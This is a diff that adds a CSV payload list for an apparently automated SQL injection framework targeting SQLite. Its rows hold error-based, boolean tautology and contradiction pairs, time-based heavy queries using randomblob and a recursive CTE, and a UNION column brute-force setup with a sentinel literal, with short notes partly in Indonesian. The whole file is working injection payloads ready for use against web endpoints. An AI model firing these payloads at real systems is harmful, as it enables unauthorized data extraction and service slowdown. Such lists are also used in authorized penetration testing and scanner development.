@@ -1,0 +1,41 @@
+technique,payload,label,pair,max_columns,sentinel_literal,notes
+# ===================== ERROR-BASED (SQLite generic) =====================,,,,,,
+error,',,,,,"Break string literal (unbalanced quote) → near """""": syntax error"
+error,"""",,,,"Break string literal (double-quote) → near """""": syntax error",
+error,')--,,,,"Close string + comment → near """")"""": syntax error",
+error,""" )--",,,,Close string + comment variant,
+error,'; --,,,,Terminate + comment,
+error,'||'x'='x,,,,String concat (SQLite uses ||),
+# ---- function/arity & missing function (common on SQLite) ----,,,,,,
+error,"' AND abs(''x'',''y'')=1 --",,,,Wrong number of arguments for abs() → error,
+error,' AND nosuchfunc(1)=1 --,,,,no such function: nosuchfunc,
+# ---- identifier/column tricks ----,,,,,,
+error,' AND (SELECT nosuchcolumn) --,,,,no such column error (if subquery executes),
+# ---- URL-encoded basics ----,,,,,,
+error,%27,,,,URL-encoded quote,
+error,%22,,,,URL-encoded double-quote,
+error,%27%29--,,,,"URL-encoded ""')--""",
+error,%27%3B%20--,,,,"URL-encoded ""'; --""",
+# ===================== BOOLEAN-BASED (pairs) =====================,,,,,,
+boolean,' OR '1'='1' --,true,B1,,,String tautology
+boolean,' AND '1'='2' --,false,B1,,,String contradiction
+boolean,1 OR 1=1 --,true,B2,,,Numeric tautology
+boolean,1 AND 1=2 --,false,B2,,,Numeric contradiction
+boolean,' OR 2>1 --,true,B3,,,Relational tautology
+boolean,' AND 2<1 --,false,B3,,,Relational contradiction
+# URL-encoded pair,,,,,,
+boolean,%27%20OR%20%271%27%3D%271%27%20--,true,B4,,,URL-encoded tautology
+boolean,%27%20AND%20%271%27%3D%272%27%20--,false,B4,,,URL-encoded contradiction
+# Close-string pair,,,,,,
+boolean,') OR ('1'='1,true,B5,,,Close + OR true
+boolean,') AND ('1'='2,false,B5,,,Close + AND false
+# ===================== TIME-BASED =====================,,,,,,
+time,' AND hex(randomblob(20000000)) IS NOT NULL --,,,,CPU/memory heavy op → respon melambat,
+time,' AND (SELECT hex(randomblob(15000000))) IS NOT NULL --,,,,Subquery heavy op,
+time,' AND (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c LIMIT 1500000) SELECT max(x) FROM c) > 0 --,,,,Recursive CTE heavy; disable jika SQLite build menolak,
+# (Tip: set TIME_THRESHOLD ≈ 2.5–3.5s sesuai mesin kamu),,,,,,
+# ===================== UNION =====================,,,,,,
+union,,,,6,__SQLITE_SENTINEL__,Set max_columns=6; framework akan brute kolom & cari literal __SQLITE_SENTINEL__
+# ===================== EXTRA (opsional,tetap SQLite-friendly) =====================,,,,,
+error,' || (SELECT sqlite_version()) || ',,,,Kadang ter-echo ke output; bisa picu error di endpoint tertentu,
+error,' AND CAST(json('x') AS INT)=1 --,,,,Jika JSON1 tidak tersedia → no such function: json; jika ada → cast error,
